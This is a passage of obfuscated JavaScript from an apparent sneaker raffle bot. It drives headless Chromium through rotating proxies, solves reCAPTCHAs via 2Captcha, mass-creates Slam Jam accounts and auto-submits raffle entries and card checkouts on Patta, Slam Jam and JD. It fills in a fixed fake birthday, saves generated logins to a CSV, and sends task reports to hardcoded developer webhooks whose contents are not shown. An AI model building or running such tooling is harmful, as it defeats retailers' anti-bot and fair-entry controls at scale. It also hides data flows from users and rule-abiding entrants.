            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x312a80 = 0x0; _0x312a80 < _0x5654b8['length']; _0x312a80++) {
        var _0x1ce45b, _0x243308 = '', _0x466eea = 0x0;
        _0x4bc62a(_0x17d36['name'] + '\x20Task\x20' + (_0x312a80 + 0x1) + '\x20/\x20' + _0x5654b8['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x5654b8, _0x312a80);
        if (_0x5654b8[_0x312a80]['Email'] == '' || _0x5654b8[_0x312a80]['Password'] == '' || _0x5654b8[_0x312a80]['FirstName'] == '' || _0x5654b8[_0x312a80]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x336e0d = _0x2540cf[_0x312a80]['split'](':');
        else
            var _0x51562a = Math['round'](Math['random']() * (_0x2540cf['length'] - 0x1)), _0x336e0d = _0x2540cf[_0x51562a]['split'](':');
        const _0x22ab58 = await _0x3102e9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x336e0d[0x0] + ':' + _0x336e0d[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x42f0c2 = await _0x22ab58['newPage']();
            await _0x42f0c2['authenticate']({
                'username': '' + _0x336e0d[0x2],
                'password': '' + _0x336e0d[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x42f0c2['setRequestInterception'](!![]), _0x42f0c2['on']('request', _0x3e5ff4 => {
                _0x3e5ff4['resourceType']() === 'image' || _0x3e5ff4['resourceType']() === 'font' || _0x3e5ff4['resourceType']() === 'media' ? _0x3e5ff4['abort']() : _0x3e5ff4['continue']();
            }), await _0x42f0c2['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x42f0c2['waitForSelector']('#CustomerEmail'), console['log'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x42f0c2['type']('#CustomerEmail', '' + _0x5654b8[_0x312a80]['Email']), await _0x19d76a(0x12c), await _0x42f0c2['type']('#CustomerPassword', '' + _0x5654b8[_0x312a80]['Password']), await _0x19d76a(0x226), await _0x42f0c2['$eval']('#customer_login', _0x2ec165 => _0x2ec165['submit']());
            try {
                await _0x42f0c2['waitForSelector']('#orders'), await _0x19d76a(0x4b0);
            } catch {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x42f0c2['goto']('' + _0x5654b8[_0x312a80]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x19d76a(0xbb8), console['log'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x42f0c2['waitForSelector']('#email');
            } catch {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x42f0c2['type']('#email', '' + _0x5654b8[_0x312a80]['Email']), await _0x19d76a(0x384), await _0x42f0c2['type']('#first_name', '' + _0x5654b8[_0x312a80]['FirstName']), await _0x19d76a(0x514), await _0x42f0c2['type']('#last_name', '' + _0x5654b8[_0x312a80]['LastName']), await _0x19d76a(0x514), await _0x42f0c2['type']('#street_address', _0x5654b8[_0x312a80]['Address1'] + '\x20' + _0x5654b8[_0x312a80]['HouseNumber'] + '\x20' + _0x5654b8[_0x312a80]['Address2']), await _0x19d76a(0x2bc);
            _0x5654b8[_0x312a80]['Postcode'] == undefined && (_0x5654b8[_0x312a80]['Postcode'] = _0x5654b8[_0x312a80]['Zip']);
            await _0x42f0c2['type']('#zip_code', '' + _0x5654b8[_0x312a80]['Postcode']), await _0x19d76a(0x320), await _0x42f0c2['type']('#city', '' + _0x5654b8[_0x312a80]['City']), await _0x19d76a(0x320), await _0x42f0c2['type']('#bday', '01/01/1994'), await _0x19d76a(0x320), await _0x42f0c2['type']('#instagram', '' + _0x5654b8[_0x312a80]['Follower']), await _0x19d76a(0x352);
            if (_0x5654b8[_0x312a80]['Size'] == 'RANDOM') {
                const _0x39a720 = await _0x42f0c2['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1cd560 => {
                    return _0x1cd560['map'](_0x26f1df => _0x26f1df['textContent']);
                });
                var _0x454e5a = Math['round'](Math['random']() * (_0x39a720['length'] - 0x1));
                console['log'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x39a720[_0x454e5a]), await _0x42f0c2['click']('label[data-eu-size=\x22' + _0x39a720[_0x454e5a] + '\x22]');
            } else {
                console['log'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x5654b8[_0x312a80]['Size']);
                try {
                    await _0x42f0c2['click']('label[data-eu-size=\x22' + _0x5654b8[_0x312a80]['Size'] + '\x22]');
                } catch {
                    await _0x42f0c2['click']('label[data-eu-size=\x22' + _0x5654b8[_0x312a80]['Size'] + '.0\x22]');
                }
            }
            await _0x19d76a(0xbb8), await _0x42f0c2['$$eval']('.raffle__checkbox-label', _0x8de8f4 => _0x8de8f4['forEach'](_0x30bcbd => _0x30bcbd['click']())), await _0x19d76a(0x7d0), console['log'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x42f0c2['click']('#raffle__form-submit'), await _0x19d76a(0x1388);
            try {
                await _0x42f0c2['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x3d044d) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x3d044d));
            }
        } catch (_0x5bc8f1) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20' + _0x5bc8f1)), _0x243308 = 'yes';
        } finally {
            _0x22ab58 && _0x22ab58['close']();
            if (_0x243308 == 'yes' && _0x466eea != 0x5) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x17d36['name'] + ']\x20Task\x20' + (_0x312a80 + 0x1) + '\x20:\x20Retrying')), _0x312a80 = _0x312a80 - 0x1, _0x466eea = _0x466eea + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x428ef4(_0x3244a3, _0x72eea, _0xe86464, _0x4bf83e) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3e372a = 0x0; _0x3e372a < _0xe86464['length']; _0x3e372a++) {
        var _0xc06f78 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }];
        const _0x32e362 = { 'embeds': _0xc06f78 };
        _0x4bc62a(_0x72eea['name'] + '\x20Task\x20' + (_0x3e372a + 0x1) + '\x20/\x20' + _0xe86464['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0xe86464, _0x3e372a);
        var _0x1cec0d = await _0x83146(_0xe86464[_0x3e372a], _0x72eea, 'acc', ![]);
        const _0x2b135b = { 'succesDEVMSG': { 'embeds': [_0x1cec0d] } };
        if (_0xe86464[_0x3e372a]['Email'] == '' || _0xe86464[_0x3e372a]['FirstName'] == '' || _0xe86464[_0x3e372a]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x19d76a(0x7d0);
            continue;
        }
        (_0xe86464[_0x3e372a]['Password'] == '' || _0xe86464[_0x3e372a] == undefined) && _0xe86464[_0x3e372a]['Password'] == 'JRaffles23!';
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x2ff751 = _0x4bf83e[_0x3e372a]['split'](':');
        else
            var _0x596bbe = Math['round'](Math['random']() * (_0x4bf83e['length'] - 0x1)), _0x2ff751 = _0x4bf83e[_0x596bbe]['split'](':');
        const _0x88b8d7 = await _0x3102e9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x2ff751[0x0] + ':' + _0x2ff751[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x102808 = await _0x88b8d7['newPage']();
            await _0x102808['authenticate']({
                'username': '' + _0x2ff751[0x2],
                'password': '' + _0x2ff751[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x102808['setRequestInterception'](!![]), _0x102808['on']('request', _0x3fa286 => {
                _0x3fa286['resourceType']() === 'image' || _0x3fa286['resourceType']() === 'font' || _0x3fa286['resourceType']() === 'media' ? _0x3fa286['abort']() : _0x3fa286['continue']();
            }), await _0x102808['goto']('https://drop.slamjam.com/account/register'), await _0x19d76a(0xbb8), await _0x102808['waitForSelector']('#FirstName'), await _0x102808['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x102808['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Filling\x20information'), await _0x19d76a(0x4b0), await _0x102808['type']('#FirstName', '' + _0xe86464[_0x3e372a]['FirstName']), await _0x19d76a(0x226), await _0x102808['type']('#LastName', '' + _0xe86464[_0x3e372a]['LastName']), await _0x19d76a(0x226), await _0x102808['type']('#Email', '' + _0xe86464[_0x3e372a]['Email']), await _0x19d76a(0x2ee), await _0x102808['type']('#ConfirmEmail', '' + _0xe86464[_0x3e372a]['Email']), await _0x19d76a(0x2ee), await _0x102808['type']('#CreatePassword', '' + _0xe86464[_0x3e372a]['Password']), await _0x19d76a(0x2ee), await _0x102808['type']('#CreateConfirmPassword', '' + _0xe86464[_0x3e372a]['Password']), await _0x19d76a(0x226), console['log'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Submitting..'), await _0x102808['$eval']('#create_customer', _0x4ea039 => _0x4ea039['submit']()), await _0x19d76a(0x1388), console['log'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20' + _0x304ca1['cyan']('Solving\x20Captcha')), await _0x102808['solveRecaptchas'](), console['log'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x102808['$eval']('.shopify-challenge__container\x20>\x20form', _0x9f7f59 => _0x9f7f59['submit']());
            try {
                await _0x102808['waitForSelector']('.product-card__image'), await _0x19d76a(0x1f4), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Account\x20' + _0xe86464[_0x3e372a]['Email'] + '\x20Generated!')), _0x20c314['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0xe86464[_0x3e372a]['Email'] + ',' + _0xe86464[_0x3e372a]['Password']), console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0x72eea['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Account\x20' + _0xe86464[_0x3e372a]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x2b135b['succesDEVMSG']);
                } catch {
                }
                await _0xdeed(_0x43652e, _0x2b135b['succesDEVMSG']);
            } catch (_0x500a2c) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x500a2c));
            }
        } catch (_0x3248a2) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x3e372a + 0x1) + '\x20:\x20' + _0x3248a2));
        } finally {
            _0x88b8d7 && _0x88b8d7['close'](), console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x5c1081(_0x5946cf, _0x37fd57, _0x1d9a9a, _0x5c6215) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x32ee6f = 0x0; _0x32ee6f < _0x1d9a9a['length']; _0x32ee6f++) {
        var _0x53c275, _0xfa7fbb = '', _0x57f007 = 0x0;
        _0x4bc62a(_0x37fd57['name'] + '\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20/\x20' + _0x1d9a9a['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x1d9a9a, _0x32ee6f);
        if (_0x1d9a9a[_0x32ee6f]['Email'] == '' || _0x1d9a9a[_0x32ee6f]['Password'] == '' || _0x1d9a9a[_0x32ee6f]['FirstName'] == '' || _0x1d9a9a[_0x32ee6f]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x21cf32 = _0x5c6215[_0x32ee6f]['split'](':');
        else
            var _0xbabae0 = Math['round'](Math['random']() * (_0x5c6215['length'] - 0x1)), _0x21cf32 = _0x5c6215[_0xbabae0]['split'](':');
        const _0x5a82bd = await _0x3102e9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x21cf32[0x0] + ':' + _0x21cf32[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x44b007 = await _0x5a82bd['newPage']();
            await _0x44b007['authenticate']({
                'username': '' + _0x21cf32[0x2],
                'password': '' + _0x21cf32[0x3]
            }), await _0x44b007['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x44b007['setRequestInterception'](!![]), _0x44b007['on']('request', _0xc0070 => {
                _0xc0070['resourceType']() === 'image' || _0xc0070['resourceType']() === 'font' || _0xc0070['resourceType']() === 'media' ? _0xc0070['abort']() : _0xc0070['continue']();
            }), await _0x44b007['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x44b007['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x44b007['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x19d76a(0x258), await _0x44b007['waitForSelector']('#CustomerEmail'), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Logging\x20in..'), await _0x44b007['type']('#CustomerEmail', '' + _0x1d9a9a[_0x32ee6f]['Email']), await _0x19d76a(0x12c), await _0x44b007['type']('#CustomerPassword', '' + _0x1d9a9a[_0x32ee6f]['Password']), await _0x19d76a(0x226), await _0x44b007['$eval']('#customer_login', _0x2d043f => _0x2d043f['submit']()), await _0x19d76a(0x7d0), await _0x44b007['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20' + _0x304ca1['cyan']('Solving\x20Captcha')), await _0x44b007['solveRecaptchas'](), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x44b007['$eval']('.shopify-challenge__container\x20>\x20form', _0x1fc342 => _0x1fc342['submit']());
            try {
                await _0x44b007['waitForSelector']('.nav-account'), await _0x19d76a(0x4b0);
            } catch {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x44b007['goto']('' + _0x1d9a9a[_0x32ee6f]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x19d76a(0xbb8), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x44b007['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x44b007['click']('.product-select-variant-wrapper'), await _0x19d76a(0x320), await _0x44b007['click']('li.product-select-variant__value[data-size=\x22' + _0x1d9a9a[_0x32ee6f]['Size'] + '\x22]'), await _0x19d76a(0x384), await _0x44b007['$eval']('#AddToCartForm-product-template-raffle', _0x3c48cf => _0x3c48cf['submit']()), await _0x44b007['waitForSelector']('.cart-order-summary__content'), await _0x19d76a(0x514), await _0x44b007['goto']('https://drop.slamjam.com/checkout'), await _0x19d76a(0x514), await _0x44b007['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x44b007['select']('#checkout_shipping_address_country', '' + _0x1d9a9a[_0x32ee6f]['Country']), await _0x19d76a(0x200), await _0x44b007['waitForSelector']('#checkout_shipping_address_first_name'), await _0x44b007['type']('#checkout_shipping_address_first_name', '' + _0x1d9a9a[_0x32ee6f]['FirstName']), await _0x19d76a(0x237), await _0x44b007['type']('#checkout_shipping_address_last_name', '' + _0x1d9a9a[_0x32ee6f]['LastName']), await _0x19d76a(0x1e0), await _0x44b007['type']('#checkout_shipping_address_address1', _0x1d9a9a[_0x32ee6f]['Address1'] + '\x20' + _0x1d9a9a[_0x32ee6f]['HouseNumber']), await _0x19d76a(0x514), await _0x44b007['type']('#checkout_shipping_address_address2', '' + _0x1d9a9a[_0x32ee6f]['Address2']), await _0x19d76a(0x514);
            _0x1d9a9a[_0x32ee6f]['Postcode'] == undefined && (_0x1d9a9a[_0x32ee6f]['Postcode'] = _0x1d9a9a[_0x32ee6f]['Zip']);
            await _0x44b007['type']('#checkout_shipping_address_zip', '' + _0x1d9a9a[_0x32ee6f]['Postcode']), await _0x19d76a(0x2bc), await _0x44b007['type']('#checkout_shipping_address_city', '' + _0x1d9a9a[_0x32ee6f]['City']), await _0x19d76a(0x320), await _0x44b007['type']('#checkout_shipping_address_phone', '' + _0x1d9a9a[_0x32ee6f]['Phone']), await _0x19d76a(0x320), await _0x44b007['click']('#continue_button'), await _0x19d76a(0xbb8), await _0x44b007['waitForSelector']('.summary-title'), await _0x19d76a(0x320), await _0x44b007['click']('#continue_button'), await _0x19d76a(0x320), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x44b007['waitForSelector']('#checkout_credit_card_vault'), await _0x19d76a(0x3e8);
            var _0x558b26 = await _0x44b007['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1bf658 = await _0x558b26['contentFrame']();
            await _0x1bf658['click']('#number'), await _0x19d76a(0x3e8), await _0x1bf658['type']('#number', '' + _0x1d9a9a[_0x32ee6f]['CardNumber'], { 'delay': 0x78 }), _0x558b26 = await _0x44b007['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1bf658 = await _0x558b26['contentFrame'](), await _0x19d76a(0x1c2), await _0x1bf658['click']('#name'), await _0x19d76a(0x1f4), await _0x1bf658['type']('#name', '' + _0x1d9a9a[_0x32ee6f]['NameOnCard'], { 'delay': 0x78 }), _0x558b26 = await _0x44b007['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1bf658 = await _0x558b26['contentFrame'](), await _0x19d76a(0x1c2), await _0x1bf658['click']('#expiry'), await _0x19d76a(0x1f4), await _0x1bf658['type']('#expiry', '' + _0x1d9a9a[_0x32ee6f]['ExpiryDate'], { 'delay': 0x78 }), _0x558b26 = await _0x44b007['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1bf658 = await _0x558b26['contentFrame'](), await _0x19d76a(0x1c2), await _0x1bf658['click']('#verification_value'), await _0x19d76a(0x1f4), await _0x1bf658['type']('#verification_value', '' + _0x1d9a9a[_0x32ee6f]['CVV'], { 'delay': 0x78 }), await _0x44b007['$eval']('#accepts-flag-raffle', _0x18586d => _0x18586d['click']()), await _0x19d76a(0x7d0), console['log'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Processing\x20Order'), await _0x44b007['$eval']('#continue_button', _0x1360a2 => _0x1360a2['click']()), await _0x19d76a(0x1b58), await _0x44b007['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x44b007['$eval']('.edit_checkout.animate-floating-labels', _0x38205f => _0x38205f['submit']()), await _0x19d76a(0x7d0);
            try {
                await _0x44b007['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x2f8b66) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2f8b66['message']);
            }
            var _0x1c58b7 = await _0x83146(_0x1d9a9a[_0x32ee6f], _0x37fd57, 'dev', ![]), _0x2e08f0 = await _0x83146(_0x1d9a9a[_0x32ee6f], _0x37fd57, 'pub', ![]);
            const _0x2d4465 = {
                'succesDEVMSG': { 'embeds': [_0x1c58b7] },
                'succesPUBMSG': { 'embeds': [_0x2e08f0] }
            };
            try {
                _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x2d4465['succesDEVMSG']), await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x2d4465['succesDEVMSG']), await _0x19d76a(0xc8), await _0xdeed(_0x4c8fbe, _0x2d4465['succesPUBMSG']);
            } catch (_0x36a4ef) {
                console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x36a4ef));
            }
        } catch (_0xf67c5f) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20' + _0xf67c5f)), _0x53c275 = '' + _0xf67c5f;
            var _0x2f02af = await _0x83146(kickz[_0x32ee6f], _0x37fd57, 'dev', !![], _0x53c275);
            EMBEDS['errorDEV'] = { 'embeds': [_0x2f02af] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], EMBEDS['errorDEV']), await _0xdeed(_0x192865, EMBEDS['errorDEV']), _0xfa7fbb = 'yes';
        } finally {
            _0x5a82bd && _0x5a82bd['close']();
            if (_0xfa7fbb == 'yes' && _0x57f007 != 0x5) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x37fd57['name'] + ']\x20Task\x20' + (_0x32ee6f + 0x1) + '\x20:\x20Retrying')), _0x32ee6f = _0x32ee6f - 0x1, _0x57f007 = _0x57f007 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x2b3034(_0xfedc66, _0x3812b6, _0x4e05ef) {
    var _0x3a844a = ![], _0x5bcc1a = ![];
    if (_0x13b92f['captchaKey'] == '' || _0x13b92f['captchaKey'] == undefined)
        return console['log'](_0x304ca1['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4e2582 = 0x0; _0x4e2582 < _0x3812b6['length']; _0x4e2582++) {
        var _0x1ad4a1, _0x565b61 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x3812b6[_0x4e2582]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3812b6[_0x4e2582]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }];
        const _0x36f254 = { 'embeds': _0x565b61 };
        _0x4bc62a(_0xfedc66['name'] + '\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20/\x20' + _0x3812b6['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x3812b6, _0x4e2582);
        var _0x4f58ec = await _0x83146(_0x3812b6[_0x4e2582], _0xfedc66, 'dev', ![]), _0x38d926 = await _0x83146(_0x3812b6[_0x4e2582], _0xfedc66, 'pub', ![]);
        const _0x574465 = {
            'succesDEVMSG': { 'embeds': [_0x4f58ec] },
            'succesPUBMSG': { 'embeds': [_0x38d926] }
        };
        if (_0x3812b6[_0x4e2582]['Email'] == '' || _0x3812b6[_0x4e2582]['Url'] == '' || _0x3812b6[_0x4e2582]['FirstName'] == '' || _0x3812b6[_0x4e2582]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x3d107c = _0x4e05ef[_0x4e2582]['split'](':');
        else
            var _0x8f189 = Math['round'](Math['random']() * (_0x4e05ef['length'] - 0x1)), _0x3d107c = _0x4e05ef[_0x8f189]['split'](':');
        const _0x4f1f50 = await _0x3102e9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3d107c[0x0] + ':' + _0x3d107c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4242e0 = await _0x4f1f50['newPage']();
            await _0x4242e0['authenticate']({
                'username': '' + _0x3d107c[0x2],
                'password': '' + _0x3d107c[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4242e0['setRequestInterception'](!![]), _0x4242e0['on']('request', _0xb114d7 => {
                _0xb114d7['resourceType']() === 'image' || _0xb114d7['resourceType']() === 'font' || _0xb114d7['resourceType']() === 'media' ? _0xb114d7['abort']() : _0xb114d7['continue']();
            }), await _0x4242e0['goto']('' + _0x3812b6[_0x4e2582]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x4242e0['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
